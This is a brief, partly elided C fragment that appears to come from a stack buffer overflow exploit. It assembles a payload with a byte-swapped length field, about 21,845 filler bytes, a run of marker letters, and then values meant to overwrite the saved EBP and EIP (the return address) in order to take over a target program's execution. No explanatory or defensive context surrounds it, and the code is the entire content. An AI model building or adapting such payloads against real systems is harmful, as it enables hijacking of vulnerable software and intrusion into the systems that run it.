...
unsigned short swap16(unsigned short n) { return (n << 8) | (n >> 8); }
...
int main(void) {
  ...
  *(unsigned short *)&payload[p_len] = swap16(21866);
  ...
  for (i = 0; i < 21845; ++i) payload[p_len + i] &= 0x2F;
  p_len += 21845;
  for (i = 0; i < 13; ++i) payload[p_len + i] = i + 'A';
  p_len += 13;
  for (i = 0; i < ebp_len; ++i) payload[p_len + i] = ebp[i];
  p_len += ebp_len;
  for (i = 0; i < eip_len; ++i) payload[p_len + i] = eip[i];
  p_len += eip_len;
